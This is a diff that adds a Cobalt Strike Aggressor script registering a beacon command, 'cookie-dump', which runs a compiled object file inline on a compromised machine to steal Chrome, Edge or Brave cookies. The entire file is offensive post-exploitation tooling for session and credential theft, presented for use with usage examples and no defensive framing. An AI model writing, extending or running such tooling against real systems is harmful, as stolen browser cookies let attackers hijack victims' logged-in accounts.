@@ -1,0 +1,27 @@
+alias cookie-dump {
+    local('$bid $browser');
+    $bid = $1;
+    $browser = $2;
+    
+    if ($browser eq "") {
+        $browser = "all";
+    }
+    
+    btask($bid, "Running cookie dump for: $browser");
+    
+    beacon_inline_execute(
+        $bid,
+        readbof(script_resource("cookie_dump.x64.o")),
+        "cookie-dump",
+        bof("z", $browser)
+    );
+}
+
+beacon_command_register(
+    "cookie-dump",
+    "Dump browser cookies",
+    "Usage: cookie-dump [chrome|edge|brave|all]\n" .
+    "Examples:\n" .
+    "  cookie-dump chrome  - Dump Chrome cookies only\n" .
+    "  cookie-dump all     - Dump all browser cookies"
+);
